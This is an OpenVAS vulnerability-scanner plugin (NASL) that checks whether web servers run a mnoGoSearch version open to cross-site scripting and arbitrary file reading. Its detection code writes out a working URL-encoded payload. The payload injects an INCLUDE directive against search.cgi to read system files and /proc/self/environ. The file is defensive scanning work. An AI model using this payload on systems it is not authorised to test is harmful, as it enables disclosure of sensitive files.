###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mnogosearch_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# mnoGoSearch Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  HTML or web script in a user's browser session in context of an affected
  site and disclose the content of an arbitrary file.
  Impact Level: Application";

tag_affected = "mnoGoSearch Version 3.3.12 and prior";
tag_insight = "Multiple flaws due to,
  - Error when parsing certain QUERY_STRING parameters.
  - Input passed via 'STORED' parameter to search/index.html (when 'q' is set
    to 'x') is not properly sanitized before being returned to the user.";
tag_solution = "Update to mnoGoSearch 3.3.13 or later,
  For updates refer to http://www.mnogosearch.org/download.html";
tag_summary = "This host is running mnoGoSearch and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(803438);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-15 11:19:57 +0530 (Fri, 15 Mar 2013)");
  script_name("mnoGoSearch Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/90786");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52401");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1028247");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/lab/PT-2013-17");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24630");
  script_xref(name : "URL" , value : "http://www.mnogosearch.org/doc33/msearch-changelog.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120650/mnoGoSearch-3.3.12-Arbitrary-File-Read.html");

  script_description(desc);
  script_summary("Check if mnoGoSearch is vulnerable to file reading vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/cgi-bin", "/mnogosearch", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/search.cgi"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && ">mnoGoSearch:" >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = string(dir, '/search.cgi/%0A%3C!--top--%3E%0A%3C!INCLUDE%20CONTENT=%22file:/',
                             files[file],'%22%3E%0A%3C!--/top--%3E?-d/proc/self/environ');

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port:port);
        exit(0);
      }
    }
  }
}
